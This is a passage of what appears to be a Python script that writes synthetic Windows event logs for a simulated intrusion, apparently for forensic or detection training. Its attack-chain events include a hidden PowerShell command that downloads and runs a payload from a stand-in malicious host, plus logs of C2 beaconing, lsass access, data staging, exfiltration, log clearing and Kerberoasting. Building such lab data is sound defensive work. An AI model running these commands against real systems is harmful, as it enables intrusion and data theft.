      <EventRecordID>4901</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Binary">00000000</Data>
    </EventData>
  </Event>

  <!-- 2. System Boot: Operating System Version (6009) at 08:15:22Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6009</EventID>
      <TimeCreated SystemTime="2026-10-10T08:15:22.000Z" />
      <EventRecordID>4902</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MajorVersion">10</Data>
      <Data Name="MinorVersion">0</Data>
      <Data Name="BuildNumber">19045</Data>
      <Data Name="ServicePack">Enterprise</Data>
    </EventData>
  </Event>

  <!-- 3. Service Control Manager: Cryptographic Services running (7036) at 08:15:25Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" Guid="{{555908d1-a6d7-4695-8e1e-26931d2012f4}}" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T08:15:25.000Z" />
      <EventRecordID>4903</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Cryptographic Services</Data>
      <Data Name="param2">running</Data>
      <Data Name="Binary">430072007900700074005300760063000000</Data>
    </EventData>
  </Event>

  <!-- 4. Group Policy Processing Succeeded (1500) at 08:15:30Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-GroupPolicy" />
      <EventID>1500</EventID>
      <TimeCreated SystemTime="2026-10-10T08:15:30.000Z" />
      <EventRecordID>4904</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SupportInfo1">1</Data>
      <Data Name="SupportInfo2">5400</Data>
      <Data Name="ProcessingTimeInMilliseconds">840</Data>
    </EventData>
  </Event>

  <!-- 5. Interactive Logon: TARGET\jdoe (4624, LogonType 2) at 08:29:45Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-10T08:29:45.000Z" />
      <EventRecordID>4905</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">2</Data>
      <Data Name="IpAddress">127.0.0.1</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="LogonProcessName">User32</Data>
      <Data Name="AuthenticationPackageName">Negotiate</Data>
    </EventData>
  </Event>

  <!-- 6. Special Privileges Assigned: TARGET\jdoe (4672) at 08:29:46Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4672</EventID>
      <TimeCreated SystemTime="2026-10-10T08:29:46.000Z" />
      <EventRecordID>4906</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="PrivilegeList">SeChangeNotifyPrivilege</Data>
    </EventData>
  </Event>

  <!-- 7. Process Creation: explorer.exe (4688) at 08:30:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T08:30:05.000Z" />
      <EventRecordID>4907</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Windows\explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\userinit.exe</Data>
    </EventData>
  </Event>

  <!-- 8. Defender Antivirus Signatures Updated (2000) at 08:31:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Windows Defender" />
      <EventID>2000</EventID>
      <TimeCreated SystemTime="2026-10-10T08:31:00.000Z" />
      <EventRecordID>4908</EventRecordID>
      <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Product Name">Microsoft Defender Antivirus</Data>
      <Data Name="New Engine Version">1.1.24080.9</Data>
      <Data Name="New Signature Version">1.417.102.0</Data>
    </EventData>
  </Event>

  <!-- 9. Process Creation: chrome.exe browsing intranet (4688) at 08:32:10Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T08:32:10.000Z" />
      <EventRecordID>4909</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
      <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe" http://internal-portal.target.local/portal/home.html</Data>
      <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
    </EventData>
  </Event>

  <!-- 10. Process Creation: OUTLOOK.EXE (4688) at 08:45:20Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T08:45:20.000Z" />
      <EventRecordID>4910</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
      <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"</Data>
      <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
    </EventData>
  </Event>

  <!-- 11. Process Creation: EXCEL.EXE opening Budget_2026.xlsx (4688) at 09:10:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:10:00.000Z" />
      <EventRecordID>4911</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
      <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\jdoe\Documents\Budget_2026.xlsx"</Data>
      <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
    </EventData>
  </Event>

  <!-- 12. Print Spooler: Document Printed (307) at 09:15:30Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PrintService" />
      <EventID>307</EventID>
      <TimeCreated SystemTime="2026-10-10T09:15:30.000Z" />
      <EventRecordID>4912</EventRecordID>
      <Channel>Microsoft-Windows-PrintService/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <UserData>
      <DocumentPrinted xmlns="http://manifests.microsoft.com/win/2004/08/windows/printservice">
        <Param1>Budget_2026.xlsx</Param1>
        <Param2>jdoe</Param2>
        <Param3>WKSTN-FIN-01</Param3>
        <Param4>HP LaserJet Enterprise M608</Param4>
        <Param5>winspool</Param5>
        <Param6>1048576</Param6>
        <Param7>4</Param7>
      </DocumentPrinted>
    </UserData>
  </Event>

  <!-- 13. Workstation Locked (4800) at 09:30:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4800</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:00.000Z" />
      <EventRecordID>4913</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
    </EventData>
  </Event>

  <!-- 14. Workstation Unlocked (4801) at 09:42:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4801</EventID>
      <TimeCreated SystemTime="2026-10-10T09:42:00.000Z" />
      <EventRecordID>4914</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
    </EventData>
  </Event>

  <!-- ===================================================================== -->
  <!-- SECTION B: Attack Chain Telemetry (09:59:30 - 10:01:25Z)              -->
  <!-- ===================================================================== -->

  <!-- 15. Outlook Saving Phishing Attachment (Sysmon 11) at 09:59:30Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>11</EventID>
      <TimeCreated SystemTime="2026-10-10T09:59:30.000Z" />
      <EventRecordID>5001</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\02_weaponized_document.docm</Data>
      <Data Name="CreationUtcTime">2026-10-10 09:59:30.000</Data>
      <Data Name="Hashes">MD5={docm_md5},SHA256={docm_sha256}</Data>
    </EventData>
  </Event>

  <!-- 16. Process Creation: WINWORD.EXE Opening Document (4688) at 10:00:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:00.000Z" />
      <EventRecordID>5002</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
      <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\jdoe\AppData\Local\Temp\02_weaponized_document.docm"</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
      <Data Name="Hashes">MD5={docm_md5},SHA256={docm_sha256}</Data>
    </EventData>
  </Event>

  <!-- 17. Process Creation: PowerShell Cradle from Macro (4688) at 10:00:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:05.000Z" />
      <EventRecordID>5003</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://evil-payloads-delivery.org/beacon_updater.exe', 'C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe'); Start-Process 'C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe'"</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    </EventData>
  </Event>

  <!-- 18. Sysmon Event 11: File Create for beacon_updater.exe at 10:00:08Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>11</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:08.000Z" />
      <EventRecordID>5004</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
      <Data Name="CreationUtcTime">2026-10-10 10:00:08.000</Data>
      <Data Name="Hashes">MD5={pe_md5},SHA256={pe_sha256}</Data>
    </EventData>
  </Event>

  <!-- 19. Process Creation: beacon_updater.exe execution (4688) at 10:00:10Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:10.000Z" />
      <EventRecordID>5005</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
      <Data Name="CommandLine">"C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe" -c2 185.220.101.45:443 -interval 5</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="Hashes">MD5={pe_md5},SHA256={pe_sha256}</Data>
    </EventData>
  </Event>

  <!-- 20. Sysmon Event 3: Network Connection to C2 Server (185.220.101.45:443) at 10:00:15Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>3</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:15.000Z" />
      <EventRecordID>5006</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
      <Data Name="SourceIp">10.0.4.15</Data>
      <Data Name="SourcePort">49812</Data>
      <Data Name="DestinationIp">185.220.101.45</Data>
      <Data Name="DestinationPort">443</Data>
      <Data Name="DestinationHostname">c2.evil-payloads-delivery.org</Data>
    </EventData>
  </Event>

  <!-- 21. Process Creation: Discovery LOLBin whoami.exe (4688) at 10:00:18Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:18.000Z" />
      <EventRecordID>5007</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Windows\System32\whoami.exe</Data>
      <Data Name="CommandLine">whoami.exe /all</Data>
      <Data Name="ParentProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 22. Process Creation: Discovery LOLBin net.exe user /domain (4688) at 10:00:20Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:20.000Z" />
      <EventRecordID>5008</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Windows\System32\net.exe</Data>
      <Data Name="CommandLine">net.exe user /domain</Data>
      <Data Name="ParentProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 23. Sysmon Event 10: Process Access to lsass.exe (Credential Harvesting) at 10:00:26Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>10</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:26.000Z" />
      <EventRecordID>5009</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SourceImage">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
      <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
      <Data Name="GrantedAccess">0x1FFFFF</Data>
      <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9fb64|C:\Windows\System32\KERNELBASE.dll+2c38e</Data>
    </EventData>
  </Event>

  <!-- 24. Explicit Credential Logon with TARGET\svc_admin (4648) at 10:00:30Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4648</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:30.000Z" />
      <EventRecordID>5010</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="TargetUserName">svc_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="TargetServerName">DC-PROD-01.target.local</Data>
      <Data Name="ProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 25. Process Creation: 7-Zip Staging Stolen Archive (4688) at 10:00:58Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:58.000Z" />
      <EventRecordID>5011</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\Program Files\7-Zip\7z.exe</Data>
      <Data Name="CommandLine">"C:\Program Files\7-Zip\7z.exe" a -tzip "C:\Users\jdoe\AppData\Local\Temp\financial_q3_confidential.zip" "C:\Users\jdoe\Documents\Finance\*.csv" "C:\Users\jdoe\AppData\Local\Temp\domain_credentials_dump.txt"</Data>
      <Data Name="ParentProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 26. Sysmon Event 11: File Create for financial_q3_confidential.zip at 10:01:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>11</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:00.000Z" />
      <EventRecordID>5012</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data>
      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\financial_q3_confidential.zip</Data>
      <Data Name="CreationUtcTime">2026-10-10 10:01:00.000</Data>
      <Data Name="Hashes">MD5={zip_md5},SHA256={zip_sha256}</Data>
    </EventData>
  </Event>

  <!-- 27. Sysmon Event 2: Timestomping (10:01:01Z) -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>2</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:01.000Z" />
      <EventRecordID>5013</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\financial_q3_confidential.zip</Data>
      <Data Name="CreationUtcTime">2024-05-15 08:12:00.000</Data>
      <Data Name="PreviousCreationUtcTime">2026-10-10 10:01:00.000</Data>
    </EventData>
  </Event>

  <!-- 28. Sysmon Event 3: Exfiltration Connection (91.240.118.72:80) at 10:01:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>3</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:05.000Z" />
      <EventRecordID>5014</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
      <Data Name="SourceIp">10.0.4.15</Data>
      <Data Name="SourcePort">49830</Data>
      <Data Name="DestinationIp">91.240.118.72</Data>
      <Data Name="DestinationPort">80</Data>
      <Data Name="DestinationHostname">dropzone-secure-exfil.com</Data>
    </EventData>
  </Event>

  <!-- 29. Anti-Forensics: System Event Log Cleared (104) at 10:01:15Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Eventlog" />
      <EventID>104</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:15.000Z" />
      <EventRecordID>5015</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <UserData>
      <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
        <SubjectUserName>jdoe</SubjectUserName>
        <SubjectDomainName>TARGET</SubjectDomainName>
        <Channel>System</Channel>
      </LogFileCleared>
    </UserData>
  </Event>

  <!-- 30. Process Terminated: beacon_updater.exe (4689) at 10:01:25Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4689</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:25.000Z" />
      <EventRecordID>5016</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="ProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>
</Events>"""

    with open(out_file, "w", encoding="utf-8") as f:
        f.write(xml_content)
    print(f"[+] Successfully wrote Host A EVTX: {out_file}")

# -------------------------------------------------------------------------
# 8. Build Windows Event Log File: 05_endpoint_domain_controller_hostB.evtx
# -------------------------------------------------------------------------
def build_host_b_evtx(pe_sha256: str, pe_md5: str):
    out_file = os.path.join(OUT_DIR, "05_endpoint_domain_controller_hostB.evtx")

    xml_content = rf"""<Events>
  <!-- ===================================================================== -->
  <!-- SECTION A: Domain Controller Background Services, Replication & Logons -->
  <!-- ===================================================================== -->

  <!-- 1. System Boot: Event Log Service Started (6005) at 08:00:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6005</EventID>
      <TimeCreated SystemTime="2026-10-10T08:00:00.000Z" />
      <EventRecordID>7901</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Binary">00000000</Data>
    </EventData>
  </Event>

  <!-- 2. System Boot: Windows Server 2022 Datacenter (6009) at 08:00:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6009</EventID>
      <TimeCreated SystemTime="2026-10-10T08:00:02.000Z" />
      <EventRecordID>7902</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MajorVersion">10</Data>
      <Data Name="MinorVersion">0</Data>
      <Data Name="BuildNumber">20348</Data>
      <Data Name="ServicePack">Server Datacenter</Data>
    </EventData>
  </Event>

  <!-- 3. Kerberos TGT Authentication Ticket Request: WKSTN-HR-04$ (4768) at 08:20:10Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4768</EventID>
      <TimeCreated SystemTime="2026-10-10T08:20:10.000Z" />
      <EventRecordID>7903</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">WKSTN-HR-04$</Data>
      <Data Name="TargetDomainName">TARGET.LOCAL</Data>
      <Data Name="IpAddress">10.0.4.104</Data>
      <Data Name="TicketOptions">0x40810010</Data>
      <Data Name="TicketEncryptionType">0x12</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>

  <!-- 4. Kerberos Service Ticket Request: alice_smith (4769) at 08:22:15Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4769</EventID>
      <TimeCreated SystemTime="2026-10-10T08:22:15.000Z" />
      <EventRecordID>7904</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">alice_smith@TARGET.LOCAL</Data>
      <Data Name="ServiceName">FILE-SRV-01$</Data>
      <Data Name="IpAddress">10.0.4.104</Data>
      <Data Name="TicketOptions">0x40810000</Data>
      <Data Name="TicketEncryptionType">0x12</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>

  <!-- 5. Active Directory Replication Partner Synchronized (4932) at 08:45:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4932</EventID>
      <TimeCreated SystemTime="2026-10-10T08:45:00.000Z" />
      <EventRecordID>7905</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="DestinationDRA">CN=NTDS Settings,CN=DC-PROD-01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=target,DC=local</Data>
      <Data Name="SourceDRA">CN=NTDS Settings,CN=DC-BACKUP-02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=target,DC=local</Data>
      <Data Name="NamingContext">DC=target,DC=local</Data>
      <Data Name="Options">19</Data>
      <Data Name="StatusCode">0</Data>
    </EventData>
  </Event>

  <!-- 6. Task Scheduler: Maintenance Task Started (100) at 09:00:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-TaskScheduler" />
      <EventID>100</EventID>
      <TimeCreated SystemTime="2026-10-10T09:00:00.000Z" />
      <EventRecordID>7906</EventRecordID>
      <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TaskName">\Microsoft\Windows\Active Directory\AD Backup Verification</Data>
      <Data Name="UserContext">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>

  <!-- 7. Task Scheduler: Task Action Completed (201) at 09:02:15Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-TaskScheduler" />
      <EventID>201</EventID>
      <TimeCreated SystemTime="2026-10-10T09:02:15.000Z" />
      <EventRecordID>7907</EventRecordID>
      <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TaskName">\Microsoft\Windows\Active Directory\AD Backup Verification</Data>
      <Data Name="ActionName">powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Verify-ADBackup.ps1</Data>
      <Data Name="ResultCode">0</Data>
    </EventData>
  </Event>

  <!-- ===================================================================== -->
  <!-- SECTION B: Attacker Attack & Lateral Movement Telemetry (10:00 - 10:01) -->
  <!-- ===================================================================== -->

  <!-- 8. Kerberoasting: TGS Request with RC4 (0x17) Encryption (4769) at 10:00:22Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4769</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:22.000Z" />
      <EventRecordID>8001</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe@TARGET.LOCAL</Data>
      <Data Name="ServiceName">MSSQLSvc/dc-prod-01.target.local:1433</Data>
      <Data Name="TicketOptions">0x40810000</Data>
      <Data Name="TicketEncryptionType">0x17</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
